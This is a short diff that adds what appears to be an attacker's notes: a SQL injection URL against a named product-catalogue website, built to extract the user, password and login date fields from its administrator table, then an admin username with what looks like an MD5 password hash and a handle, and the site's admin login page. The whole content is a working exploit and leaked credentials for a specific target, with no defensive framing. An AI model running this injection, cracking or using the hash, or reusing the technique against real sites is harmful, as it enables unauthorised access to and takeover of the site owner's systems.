@@ -1,0 +1,5 @@
+http://cokhinganhinvannam.com/?page=products_detail&id=11999+UniOn+SELeCT+0,1,2,3,cOncat((SELeCT+uNhEx(hEX(cOncat(0x3a2353514c213a,id,0x3a2351534c213a,user,0x3a2351534c213a,pass,0x3a2351534c213a,datelogin,0x3a2351534c213a,0x233a4c51533a21)))+FrOm+invannam_db.administrator+liMit+0,1)),5--+-
+
+admin/858c7c80e75299230467bbb05690c7ca ---ngocminh
+
+http://cokhinganhinvannam.com/admin/index.php
